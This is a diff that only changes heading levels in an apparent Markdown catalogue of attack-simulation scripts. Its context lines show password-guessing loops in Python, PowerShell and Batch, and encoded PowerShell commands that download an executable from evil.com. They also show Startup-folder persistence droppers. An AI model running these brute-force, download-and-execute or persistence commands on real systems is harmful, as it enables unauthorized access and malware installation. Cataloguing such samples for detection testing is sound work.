@@ -66,8 +66,7 @@ Below are practical examples for each script type.
 
 ---
 
-### ✅ Python
-
+#### ✅ Python
 ```python
 import requests
 from requests.auth import HTTPBasicAuth
@@ -86,8 +85,7 @@ for user in users:
 
 ---
 
-### ✅ PowerShell
-
+#### ✅ PowerShell
 ```powershell
 # Attempt network share connection with bad creds
 $User = "admin"
@@ -100,8 +98,7 @@ foreach ($pwd in $Passwords) {
 
 ---
 
-### ✅ Batch
-
+#### ✅ Batch
 ```batch
 @echo off
 set USER=admin
@@ -125,8 +122,7 @@ for %%P in (%PASSWORDS%) do (
 
 ---
 
-### ✅ PowerShell
-
+#### ✅ PowerShell
 ```powershell
 # Encoded command to download file
 $Command = 'Invoke-WebRequest -Uri http://evil.com/bad.exe -OutFile C:\temp\bad.exe'
@@ -138,8 +134,7 @@ powershell.exe -EncodedCommand $Encoded
 
 ---
 
-### ✅ Batch
-
+#### ✅ Batch
 ```batch
 @echo off
 REM Spawn PowerShell with encoded download command
@@ -160,8 +155,7 @@ powershell.exe -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAL
 
 ---
 
-### ✅ Batch
-
+#### ✅ Batch
 ```batch
 @echo off
 REM Create a malicious batch file in startup folder
@@ -170,8 +164,7 @@ echo @echo Malicious Run >> %APPDATA%\Microsoft\Windows\Start Menu\Programs\Star
 
 ---
 
-### ✅ PowerShell
-
+#### ✅ PowerShell
 ```powershell
 # Drop a startup script
 $Path = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\evil.ps1"
